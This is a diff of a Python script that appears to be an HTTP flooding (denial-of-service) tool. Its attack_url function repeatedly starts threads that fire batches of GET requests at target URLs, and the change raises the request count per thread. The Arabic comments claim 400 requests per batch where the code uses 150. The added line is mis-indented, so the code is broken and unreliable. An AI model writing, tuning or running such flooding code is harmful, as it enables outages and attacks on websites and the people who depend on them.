@@ -29,8 +29,8 @@ def load_urls():
 def attack_url(url):
     while is_running:
         try:
-            for _ in range(150):  # إرسال 400 طلب دفعة واحدة
-                threading.Thread(target=requests.get, args=(url,), daemon=True).start()
+            for _ in range(10):
+    threading.Thread(target=lambda: [requests.get(url) for _ in range(10)], daemon=True).start()
         except:
             pass
         time.sleep(1)  # تقليل الانتظار بين الدُفعات
